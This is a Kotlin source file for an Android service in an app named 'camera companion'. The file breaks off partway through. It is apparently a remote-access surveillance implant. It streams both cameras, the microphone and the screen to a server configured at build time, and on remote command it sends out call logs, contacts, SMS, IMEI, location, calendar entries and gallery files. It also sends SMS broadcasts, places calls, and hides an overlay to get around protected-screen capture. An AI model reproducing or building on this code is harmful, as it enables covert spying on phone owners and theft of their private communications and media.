package com.artem.cameracompanion

import android.Manifest
import android.app.*
import android.content.*
import android.content.pm.PackageManager
import android.graphics.Bitmap
import android.graphics.Matrix
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.*
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.net.Uri
import android.os.*
import android.util.DisplayMetrics
import android.view.Display
import androidx.camera.core.*
import androidx.camera.lifecycle.ProcessCameraProvider
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.*
import okhttp3.*
import okio.ByteString.Companion.toByteString
import android.bluetooth.BluetoothAdapter
import android.bluetooth.BluetoothManager
import android.content.ContentUris
import android.hardware.camera2.CameraManager as HwCameraManager
import android.location.LocationManager
import android.net.ConnectivityManager
import android.net.NetworkCapabilities
import android.media.AudioManager
import android.os.StatFs
import android.os.VibrationEffect
import android.os.Vibrator
import android.provider.CalendarContract
import android.provider.CallLog
import android.provider.ContactsContract
import android.provider.MediaStore
import android.provider.Settings
import android.provider.Telephony
import android.telephony.SmsManager
import android.telephony.SubscriptionManager
import android.telephony.TelephonyManager
import android.util.Base64
import org.json.JSONArray
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit

class StreamingService : Service() {

    companion object {
        const val ACTION_START = "START"
        const val ACTION_STOP  = "STOP"
        const val CHANNEL_ID = "streaming"
        const val NOTIF_ID = 1
        @Volatile var isRunning = false
        @Volatile var instance: StreamingService? = null
        @Volatile var screenQuality = 60
        @Volatile var hasProjection = false
        @Volatile var statusText = "Запуск…"
        @Volatile var paused = false

        // Вызывается из SmsReceiver при входящем СМС
        private val phoneViewers = mutableSetOf<okhttp3.WebSocket>()
        fun registerPhoneViewer(ws: okhttp3.WebSocket)   { synchronized(phoneViewers) { phoneViewers.add(ws) } }
        fun unregisterPhoneViewer(ws: okhttp3.WebSocket) { synchronized(phoneViewers) { phoneViewers.remove(ws) } }
        fun pushIncomingSms(address: String, body: String, date: Long, name: String = "") {
            val msg = JSONObject()
                .put("type", "sms-incoming")
                .put("address", address)
                .put("name", name)
                .put("body", body)
                .put("date", date)
                .toString()
            synchronized(phoneViewers) { phoneViewers.forEach { it.send(msg) } }
        }

        @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
        fun onAccessibilityConnected() {
            instance?.let { svc ->
                if (svc.wsScreen == null) svc.connectScreenWsAccessibility()
            }
        }

        fun start(ctx: Context, projectionCode: Int = -1, projectionData: Intent? = null) {
            val i = Intent(ctx, StreamingService::class.java).setAction(ACTION_START)
            if (projectionCode != -1 && projectionData != null) {
                i.putExtra("projectionCode", projectionCode)
                i.putExtra("projectionData", projectionData)
            }
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                ctx.startForegroundService(i)
            else
                ctx.startService(i)
        }
        fun stop(ctx: Context) {
            ctx.startService(Intent(ctx, StreamingService::class.java).setAction(ACTION_STOP))
        }
    }

    private val lifecycleOwner = StreamingLifecycleOwner()
    private val analyzerExecutor = Executors.newSingleThreadExecutor()
    private var cameraProvider: ProcessCameraProvider? = null
    private val lastFrameBackArr  = LongArray(1)
    private val lastFrameFrontArr = LongArray(1)
    private var lastScreenFrameTime = 0L
    private var audioRecord: AudioRecord? = null
    private var audioThread: Thread? = null
    @Volatile private var currentCam = "back"
    private var wakeLock: PowerManager.WakeLock? = null
    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var screenImageReader: ImageReader? = null
    private var screenHandlerThread: HandlerThread? = null
    private var screenHandler: Handler? = null

    private val http = OkHttpClient.Builder()
        .pingInterval(5, TimeUnit.SECONDS)
        .readTimeout(0, TimeUnit.SECONDS)
        .build()

    @Volatile private var overlayView: android.view.View? = null
    private var overlayParams: android.view.WindowManager.LayoutParams? = null
    @Volatile private var overlayHiddenForCapture = false
    @Volatile private var overlayMediaFile: File? = null
    @Volatile private var overlayMediaMime: String = ""
    private var overlayMediaPlayer: android.media.MediaPlayer? = null

    @Volatile private var wsBack: WebSocket? = null
    @Volatile private var wsFront: WebSocket? = null
    @Volatile private var wsAudio: WebSocket? = null
    @Volatile private var wsScreen: WebSocket? = null
    @Volatile private var wsPhone: WebSocket? = null
    @Volatile private var wsScreenConnecting = false
    @Volatile private var frameErrorReported = false
    @Volatile private var bulkCancelled = false

    private val serverBase: String get() {
        var host = BuildConfig.DEFAULT_SERVER.trim()
        host = host.removePrefix("http://").removePrefix("ws://")
        if (!host.contains(":")) host = "$host:80"
        return "ws://$host"
    }
    private val serverHttpBase: String get() = serverBase.replace("ws://", "http://")
    private val encodedModel: String get() = Uri.encode(Build.MODEL ?: "Android")
    private val ownerSuffix: String get() {
        val u = BuildConfig.OWNER_USERNAME.trim()
        return if (u.isNotEmpty()) "&owner=${Uri.encode(u)}" else ""
    }

    override fun onCreate() {
        super.onCreate()
        isRunning = true
        instance = this
        createNotificationChannel()
        startForegroundCompat()
        lifecycleOwner.start()
        wakeLock = (getSystemService(POWER_SERVICE) as PowerManager)
            .newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "arp:streaming")
        wakeLock?.acquire(12 * 60 * 60 * 1000L)
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                refreshForegroundType()
                if (wsBack == null) connectCamWs()
                else if (cameraProvider == null &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED) bindCamera()
                if (wsAudio == null) connectAudioWs()
                val code = intent.getIntExtra("projectionCode", -1)
                @Suppress("DEPRECATION")
                val data = intent.getParcelableExtra<Intent>("projectionData")
                if (wsPhone == null) connectPhoneWs()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (wsScreen == null && ControlService.instance != null) {
                        @Suppress("NewApi")
                        connectScreenWsAccessibility()
                    }
                } else {
                    if (code != -1 && data != null && mediaProjection == null) {
                        val mgr = getSystemService(MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
                        mediaProjection = mgr.getMediaProjection(code, data)
                        hasProjection = true
                        if (wsScreen == null) connectScreenWs()
                    }
                }
            }
            "SWITCH_CAM" -> switchCamera(intent.getStringExtra("cam") ?: "back")
            ACTION_STOP  -> { disconnect(); stopSelf() }
            else -> {
                // null intent = Android restarted service after process kill (START_STICKY)
                refreshForegroundType()
                if (wsBack == null) connectCamWs()
                else if (cameraProvider == null &&
                    ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA)
                        == PackageManager.PERMISSION_GRANTED) bindCamera()
                if (wsAudio == null) connectAudioWs()
                if (wsPhone == null) connectPhoneWs()
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                    if (wsScreen == null && ControlService.instance != null) {
                        @Suppress("NewApi") connectScreenWsAccessibility()
                    }
                } else if (wsScreen == null && mediaProjection != null) {
                    connectScreenWs()
                }
            }
        }
        return START_STICKY
    }

    // ── Camera WebSockets ──────────────────────────────────────────────────

    private fun connectCamWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/camera?role=phone&cam=back&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsBack = ws
                    currentCam = "back"  // всегда начинаем с задней камеры при (пере)подключении
                    paused = false
                    updateNotification("Идёт трансляция")
                    connectFrontCamWs()
                    bindCamera()
                }
                override fun onMessage(ws: WebSocket, text: String) {
                    try {
                        val json = JSONObject(text)
                        when (json.optString("cmd")) {
                            "stop"   -> { disconnect(); stopSelf() }
                            "start"  -> { if (wsBack == null) connectCamWs() }
                            "switch" -> switchCamera(json.optString("cam", "back"))
                            "pause"  -> { paused = true; updateNotification("Приостановлено"); sendCamStatus("Трансляция приостановлена") }
                            "resume" -> { paused = false; updateNotification("Идёт трансляция"); sendCamStatus("ok") }
                        }
                    } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsBack = null; updateNotification("Ошибка подключения")
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsBack == null) connectCamWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsBack = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsBack == null) connectCamWs() }, 5000)
                }
            })
    }

    private fun connectFrontCamWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/camera?role=phone&cam=front&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsFront = ws
                    // Если уже переключились на фронт пока соединение устанавливалось — перепривязываем камеру
                    if (currentCam == "front") {
                        cameraProvider?.let { provider ->
                            ContextCompat.getMainExecutor(this@StreamingService).execute {
                                bindCameraInternal(provider)
                            }
                        }
                    }
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsFront = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsFront == null) connectFrontCamWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsFront = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsFront == null) connectFrontCamWs() }, 5000)
                }
            })
    }

    // ── Audio WebSocket ────────────────────────────────────────────────────

    private fun connectAudioWs() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO)
            != PackageManager.PERMISSION_GRANTED) return
        http.newWebSocket(
            Request.Builder().url("$serverBase/audio?role=phone&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsAudio = ws; startAudioCapture() }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsAudio = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsAudio == null) connectAudioWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsAudio = null; stopAudioCapture()
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsAudio == null) connectAudioWs() }, 5000)
                }
            })
    }

    private fun startAudioCapture() {
        try {
            val rate = 16000
            val minBuf = AudioRecord.getMinBufferSize(rate, AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT)
            val bufSize = maxOf(if (minBuf > 0) minBuf else 3200, 3200) * 4
            val rec = AudioRecord(MediaRecorder.AudioSource.MIC, rate,
                AudioFormat.CHANNEL_IN_MONO, AudioFormat.ENCODING_PCM_16BIT, bufSize)
            if (rec.state != AudioRecord.STATE_INITIALIZED) { rec.release(); return }
            audioRecord = rec
            rec.startRecording()
            audioThread = Thread {
                val chunk = ShortArray(1600)
                while (!Thread.currentThread().isInterrupted) {
                    val ws = wsAudio ?: break
                    val read = try { rec.read(chunk, 0, chunk.size) } catch (_: Exception) { break }
                    if (read <= 0) continue
                    if (ws.queueSize() > 64 * 1024) continue
                    val bytes = ByteArray(read * 2)
                    ByteBuffer.wrap(bytes).order(ByteOrder.LITTLE_ENDIAN).asShortBuffer().put(chunk, 0, read)
                    ws.send(bytes.toByteString())
                }
            }.apply { isDaemon = true; start() }
        } catch (_: Exception) { }
    }

    private fun stopAudioCapture() {
        audioThread?.interrupt(); audioThread = null
        try { audioRecord?.stop() } catch (_: Exception) {}
        audioRecord?.release(); audioRecord = null
    }

    // ── Screen streaming via MediaProjection ──────────────────────────────

    private fun connectScreenWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/screen?role=phone&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) { wsScreen = ws; startVirtualDisplay() }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsScreen = null; releaseVirtualDisplay()
                    if (isRunning && mediaProjection != null)
                        Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsScreen == null && mediaProjection != null) connectScreenWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsScreen = null; releaseVirtualDisplay()
                    if (isRunning && mediaProjection != null)
                        Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsScreen == null && mediaProjection != null) connectScreenWs() }, 5000)
                }
            })
    }

    private fun startVirtualDisplay() {
        val mp = mediaProjection ?: return
        if (Build.VERSION.SDK_INT == Build.VERSION_CODES.Q) {
            // API 29 requires the running FGS to declare mediaProjection type before createVirtualDisplay
            var type = android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MEDIA_PROJECTION or
                       android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED)
                type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED)
                type = type or android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            @Suppress("InlinedApi")
            startForeground(NOTIF_ID, buildNotification(statusText), type)
        }
        val dm = getSystemService(DISPLAY_SERVICE) as DisplayManager
        val display = dm.getDisplay(Display.DEFAULT_DISPLAY) ?: return
        val metrics = DisplayMetrics()
        @Suppress("DEPRECATION")
        display.getRealMetrics(metrics)
        val w = (metrics.widthPixels / 2).coerceAtLeast(360)
        val h = (metrics.heightPixels / 2).coerceAtLeast(640)
        val dpi = metrics.densityDpi / 2
        val ht = HandlerThread("arp_screen_reader").also { it.start(); screenHandlerThread = it }
        val handler = Handler(ht.looper).also { screenHandler = it }
        val reader = ImageReader.newInstance(w, h, PixelFormat.RGBA_8888, 2)
        screenImageReader = reader
        reader.setOnImageAvailableListener({ r ->
            val img = r.acquireLatestImage() ?: return@setOnImageAvailableListener
            var restoreOverlay = false
            try {
                if (paused) return@setOnImageAvailableListener
                val ws = wsScreen ?: return@setOnImageAvailableListener
                if (ws.queueSize() > 512 * 1024) return@setOnImageAvailableListener
                val now = System.currentTimeMillis()
                if (now - lastScreenFrameTime < 80) return@setOnImageAvailableListener
                // On Android < 11, FLAG_SECURE shows black in VirtualDisplay.
                // Briefly hide overlay for one frame to get clean capture.
                val ov = overlayView; val op = overlayParams
                if (ov != null && op != null) {
                    if (!overlayHiddenForCapture) {
                        overlayHiddenForCapture = true
                        Handler(Looper.getMainLooper()).post {
                            op.alpha = 0f
                            try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(ov, op) } catch (_: Exception) {}
                        }
                        return@setOnImageAvailableListener // skip, next frame will be clean
                    }
                    overlayHiddenForCapture = false
                    restoreOverlay = true
                }
                lastScreenFrameTime = now
                val plane = img.planes[0]
                val rowW = plane.rowStride / plane.pixelStride
                val bmp = Bitmap.createBitmap(rowW, h, Bitmap.Config.ARGB_8888)
                try {
                    bmp.copyPixelsFromBuffer(plane.buffer)
                    val cropped = if (rowW > w) Bitmap.createBitmap(bmp, 0, 0, w, h).also { bmp.recycle() } else bmp
                    try {
                        val out = ByteArrayOutputStream()
                        cropped.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
                        ws.send(out.toByteArray().toByteString())
                    } finally {
                        cropped.recycle()
                    }
                } catch (_: Exception) {
                    if (!bmp.isRecycled) bmp.recycle()
                }
            } finally {
                img.close()
                if (restoreOverlay) {
                    val ov = overlayView; val op = overlayParams
                    if (ov != null && op != null) {
                        Handler(Looper.getMainLooper()).post {
                            op.alpha = 1f
                            try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(ov, op) } catch (_: Exception) {}
                        }
                    }
                }
            }
        }, handler)
        try {
            virtualDisplay = mp.createVirtualDisplay("arp_screen", w, h, dpi,
                DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR, reader.surface, null, null)
        } catch (_: Exception) { releaseVirtualDisplay() }
    }

    private fun releaseVirtualDisplay() {
        virtualDisplay?.release(); virtualDisplay = null
        screenImageReader?.close(); screenImageReader = null
        screenHandlerThread?.quitSafely(); screenHandlerThread = null; screenHandler = null
    }

    // ── Screen streaming via AccessibilityService (API 30+) ───────────────

    @Volatile private var accessibilityCaptureRunning = false
    private val accessibilityHandler = android.os.Handler(android.os.Looper.getMainLooper())

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
    fun connectScreenWsAccessibility() {
        if (wsScreenConnecting || wsScreen != null) return
        wsScreenConnecting = true
        http.newWebSocket(
            Request.Builder().url("$serverBase/screen?role=phone&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsScreenConnecting = false
                    wsScreen = ws
                    startAccessibilityCapture()
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    wsScreen = null; stopAccessibilityCapture()
                    if (isRunning && ControlService.instance != null)
                        accessibilityHandler.postDelayed({
                            if (isRunning && wsScreen == null && ControlService.instance != null) connectScreenWsAccessibility()
                        }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    wsScreen = null; stopAccessibilityCapture()
                    if (isRunning && ControlService.instance != null)
                        accessibilityHandler.postDelayed({
                            if (isRunning && wsScreen == null && ControlService.instance != null) connectScreenWsAccessibility()
                        }, 5000)
                }
            })
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
    private fun startAccessibilityCapture() {
        if (accessibilityCaptureRunning) return
        accessibilityCaptureRunning = true
        accessibilityHandler.post { doCapture() }
    }

    private fun stopAccessibilityCapture() {
        accessibilityCaptureRunning = false
        wsScreenConnecting = false
        accessibilityHandler.removeCallbacksAndMessages(null)
    }

    @androidx.annotation.RequiresApi(Build.VERSION_CODES.R)
    private fun doCapture() {
        if (!accessibilityCaptureRunning) return
        val ws = wsScreen
        val ctrl = ControlService.instance
        if (ws == null || ctrl == null) { accessibilityCaptureRunning = false; return }
        if (paused || ws.queueSize() > 512 * 1024) {
            accessibilityHandler.postDelayed({ doCapture() }, 80)
            return
        }
        val now = System.currentTimeMillis()
        if (now - lastScreenFrameTime < 80) {
            accessibilityHandler.postDelayed({ doCapture() }, 80 - (now - lastScreenFrameTime))
            return
        }
        lastScreenFrameTime = now

        fun doActualCapture() {
            ctrl.captureScreen { hw ->
                if (hw != null && accessibilityCaptureRunning) {
                    try {
                        val bmp = hw.copy(Bitmap.Config.ARGB_8888, false)
                        hw.recycle()
                        try {
                            val out = ByteArrayOutputStream()
                            bmp.compress(Bitmap.CompressFormat.JPEG, screenQuality, out)
                            wsScreen?.send(out.toByteArray().toByteString())
                        } finally {
                            bmp.recycle()
                        }
                    } catch (_: Throwable) {
                        if (!hw.isRecycled) hw.recycle()
                    }
                } else {
                    hw?.recycle()
                }
                // Restore overlay on Android 11 where we temporarily hid it
                if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
                    val v = overlayView; val p = overlayParams
                    if (v != null && p != null) {
                        Handler(Looper.getMainLooper()).post {
                            p.alpha = 1f
                            try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(v, p) } catch (_: Exception) {}
                        }
                    }
                }
                if (accessibilityCaptureRunning) accessibilityHandler.postDelayed({ doCapture() }, 80)
            }
        }

        // On Android 11 (R), FLAG_SECURE causes the entire capture to go black.
        // Work around by briefly setting overlay alpha=0, waiting one frame, then capturing.
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.S) {
            val v = overlayView; val p = overlayParams
            if (v != null && p != null) {
                Handler(Looper.getMainLooper()).post {
                    p.alpha = 0f
                    try { (getSystemService(WINDOW_SERVICE) as android.view.WindowManager).updateViewLayout(v, p) } catch (_: Exception) {}
                }
                accessibilityHandler.postDelayed({ doActualCapture() }, 32)
                return
            }
        }
        doActualCapture()
    }

    // ── Phone / Calls WebSocket ────────────────────────────────────────────

    private fun connectPhoneWs() {
        http.newWebSocket(
            Request.Builder().url("$serverBase/phone?role=phone&model=$encodedModel$ownerSuffix").build(),
            object : WebSocketListener() {
                override fun onOpen(ws: WebSocket, response: Response) {
                    wsPhone = ws
                    registerPhoneViewer(ws)
                    sendPhoneInfo(ws)
                    sendCallLog(ws)
                }
                override fun onMessage(ws: WebSocket, text: String) {
                    try {
                        val json = JSONObject(text)
                        when (json.optString("cmd")) {
                            "get-phone-info"     -> sendPhoneInfo(ws)
                            "get-system-info"    -> sendSystemInfo(ws)
                            "get-call-log"       -> sendCallLog(ws)
                            "get-contacts"       -> sendContacts(ws)
                            "call"               -> makeCall(json.optString("number", ""), ws)
                            "get-sms"            -> sendSmsList(ws)
                            "send-sms"           -> sendSmsMessage(json.optString("number", ""), json.optString("text", ""), ws)
                            "send-sms-broadcast" -> sendSmsBroadcast(json.optString("text", ""), ws)
                            "get-volume"         -> sendVolumeInfo(ws)
                            "set-volume"         -> setVolume(json.optString("stream","media"), json.optInt("value",5), ws)
                            "set-bluetooth"      -> setBluetooth(json.optBoolean("enabled", false), ws)
                            "set-torch"          -> setTorch(json.optBoolean("enabled", false), ws)
                            "vibrate"            -> doVibrate(json.optLong("ms", 500))
                            "get-file"           -> sendFile(json.optString("path",""), json.optString("requestId",""), ws)
                            "get-gallery-stats"  -> sendGalleryStats(ws)
                            "get-bulk-download"  -> { bulkCancelled = false; sendBulkFiles(json.optString("mediaType","all"), json.optInt("photoLimit",0), json.optInt("videoLimit",0), ws) }
                            "cancel-bulk"        -> bulkCancelled = true
                            "get-location"       -> sendLocation(ws)
                            "get-gallery"         -> sendGallery(json.optString("mediaType","images"), json.optInt("limit",40), json.optInt("offset",0), ws, json.optString("bucketId",""))
                            "get-gallery-folders" -> sendGalleryFolders(ws)
                            "get-media-thumb"    -> sendMediaThumb(json.optLong("id",0), json.optString("mediaType","images"), ws)
                            "get-media-file"     -> sendMediaFile(json.optLong("id",0), json.optString("mediaType","images"), json.optString("requestId",""), ws)
                            "get-calendar"       -> sendCalendarEvents(json.optInt("days",14), ws)
                            "set-overlay"        -> {
                                val wantEnabled = json.optBoolean("enabled", false)
                                if (wantEnabled) showOverlay() else hideOverlay()
                                // Send status after posting to main looper so overlayView reflects the new state
                                Handler(Looper.getMainLooper()).post {
                                    ws.send(JSONObject().put("type","overlay-status").put("enabled", overlayView != null).toString())
                                }
                            }
                            "set-overlay-media"  -> handleSetOverlayMedia(json)
                        }
                    } catch (_: Exception) {}
                }
                override fun onFailure(ws: WebSocket, t: Throwable, response: Response?) {
                    unregisterPhoneViewer(ws)
                    if (ws == wsPhone) wsPhone = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsPhone == null) connectPhoneWs() }, 5000)
                }
                override fun onClosed(ws: WebSocket, code: Int, reason: String) {
                    unregisterPhoneViewer(ws)
                    if (ws == wsPhone) wsPhone = null
                    if (isRunning) Handler(Looper.getMainLooper()).postDelayed({ if (isRunning && wsPhone == null) connectPhoneWs() }, 5000)
                }
            })
    }

    private fun sendPhoneInfo(ws: WebSocket) {
        try {
            val tm = getSystemService(TELEPHONY_SERVICE) as TelephonyManager
            val json = JSONObject()
            json.put("type", "phone-info")
            json.put("model", "${Build.MANUFACTURER} ${Build.MODEL}")
            json.put("androidVersion", "Android ${Build.VERSION.RELEASE} (API ${Build.VERSION.SDK_INT})")
            json.put("operator", tm.networkOperatorName ?: "")
            json.put("simOperator", tm.simOperatorName ?: "")
            @Suppress("DEPRECATION")
            json.put("networkType", getNetworkTypeName(tm.networkType))
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_NUMBERS)
                == PackageManager.PERMISSION_GRANTED) {
                json.put("number", tm.line1Number ?: "")
            }
            try {
                val imei = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
                    tm.imei ?: "" else @Suppress("DEPRECATION") tm.deviceId ?: ""
                json.put("imei", imei)
            } catch (_: Exception) {}
            try {
                val sm = getSystemService(TELEPHONY_SUBSCRIPTION_SERVICE) as? SubscriptionManager
                val sims = JSONArray()
                sm?.activeSubscriptionInfoList?.forEach { info ->
                    val sim = JSONObject()
                    sim.put("slot", info.simSlotIndex + 1)
                    sim.put("displayName", info.displayName?.toString() ?: "")
                    sim.put("carrierName", info.carrierName?.toString() ?: "")
                    sim.put("number", info.number ?: "")
                    sims.put(sim)
                }
                if (sims.length() > 0) json.put("sims", sims)
            } catch (_: Exception) {}
            try {
                val bm = getSystemService(BATTERY_SERVICE) as? android.os.BatteryManager
                val level = bm?.getIntProperty(android.os.BatteryManager.BATTERY_PROPERTY_CAPACITY) ?: -1
                if (level >= 0) json.put("battery", level)
            } catch (_: Exception) {}
            try {
                fun hasPerm(p: String) = ContextCompat.checkSelfPermission(this, p) == PackageManager.PERMISSION_GRANTED
                val accessEnabled = (Settings.Secure.getString(contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: "").contains(packageName, ignoreCase = true)
                val perms = JSONObject()
                perms.put("camera",        hasPerm(Manifest.permission.CAMERA))
                perms.put("mic",           hasPerm(Manifest.permission.RECORD_AUDIO))
                perms.put("phone",         hasPerm(Manifest.permission.READ_PHONE_STATE))
                perms.put("contacts",      hasPerm(Manifest.permission.READ_CONTACTS))
                perms.put("sms",           hasPerm(Manifest.permission.READ_SMS))
                perms.put("accessibility", accessEnabled)
                perms.put("projection",    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) ControlService.instance != null else hasProjection)
                perms.put("notifications", if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPerm(Manifest.permission.POST_NOTIFICATIONS) else true)
                perms.put("btConnect",     if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.S) hasPerm(Manifest.permission.BLUETOOTH_CONNECT) else true)
                perms.put("location",      hasPerm(Manifest.permission.ACCESS_FINE_LOCATION))
                perms.put("mediaImages",   if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPerm(Manifest.permission.READ_MEDIA_IMAGES) else hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE))
                perms.put("mediaVideo",    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) hasPerm(Manifest.permission.READ_MEDIA_VIDEO) else hasPerm(Manifest.permission.READ_EXTERNAL_STORAGE))
                perms.put("calendar",      hasPerm(Manifest.permission.READ_CALENDAR))
                perms.put("overlay",       if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(this) else true)
                perms.put("overlayActive", overlayView != null)
                json.put("perms", perms)
            } catch (_: Exception) {}
            val ownerName = BuildConfig.OWNER_USERNAME.trim()
            if (ownerName.isNotEmpty()) json.put("owner", ownerName)
            ws.send(json.toString())
        } catch (_: Exception) {}
    }

    @Suppress("DEPRECATION")
    private fun getNetworkTypeName(type: Int): String = when (type) {
        TelephonyManager.NETWORK_TYPE_LTE    -> "LTE/4G"
        TelephonyManager.NETWORK_TYPE_HSDPA,
        TelephonyManager.NETWORK_TYPE_HSUPA,
        TelephonyManager.NETWORK_TYPE_HSPA,
        TelephonyManager.NETWORK_TYPE_HSPAP  -> "HSPA/3G+"
        TelephonyManager.NETWORK_TYPE_UMTS   -> "3G UMTS"
        TelephonyManager.NETWORK_TYPE_EDGE   -> "EDGE/2G+"
        TelephonyManager.NETWORK_TYPE_GPRS   -> "GPRS/2G"
        TelephonyManager.NETWORK_TYPE_CDMA,
        TelephonyManager.NETWORK_TYPE_1xRTT  -> "CDMA"
        TelephonyManager.NETWORK_TYPE_EVDO_0,
        TelephonyManager.NETWORK_TYPE_EVDO_A,
        TelephonyManager.NETWORK_TYPE_EVDO_B -> "EVDO"
        20                                   -> "5G NR"
        else                                 -> "неизвестно ($type)"
    }

    private fun sendCallLog(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG)
            != PackageManager.PERMISSION_GRANTED) {
            ws.send(JSONObject().put("type", "call-log-error")
                .put("msg", "Нет разрешения READ_CALL_LOG").toString())
            return
        }
        try {
            val entries = JSONArray()
            val cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                arrayOf(CallLog.Calls.NUMBER, CallLog.Calls.CACHED_NAME,
                        CallLog.Calls.TYPE, CallLog.Calls.DATE, CallLog.Calls.DURATION),
                null, null, "${CallLog.Calls.DATE} DESC"
            )
            cursor?.use { c ->
                val numCol  = c.getColumnIndex(CallLog.Calls.NUMBER)
                val nameCol = c.getColumnIndex(CallLog.Calls.CACHED_NAME)
                val typeCol = c.getColumnIndex(CallLog.Calls.TYPE)
                val dateCol = c.getColumnIndex(CallLog.Calls.DATE)
                val durCol  = c.getColumnIndex(CallLog.Calls.DURATION)
                var count = 0
                while (c.moveToNext() && count < 50) {
                    val e = JSONObject()
                    e.put("number",   c.getString(numCol)  ?: "")
                    e.put("name",     c.getString(nameCol) ?: "")
                    e.put("callType", when (c.getInt(typeCol)) {
                        CallLog.Calls.INCOMING_TYPE -> "incoming"
                        CallLog.Calls.OUTGOING_TYPE -> "outgoing"
                        CallLog.Calls.MISSED_TYPE   -> "missed"
                        else                        -> "unknown"
                    })
                    e.put("date",     c.getLong(dateCol))
                    e.put("duration", c.getInt(durCol))
                    entries.put(e)
                    count++
                }
            }
            ws.send(JSONObject().put("type", "call-log").put("entries", entries).toString())
        } catch (e: Exception) {
            ws.send(JSONObject().put("type", "call-log-error").put("msg", e.message ?: "ошибка").toString())
        }
    }

    private fun sendContacts(ws: WebSocket) {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS)
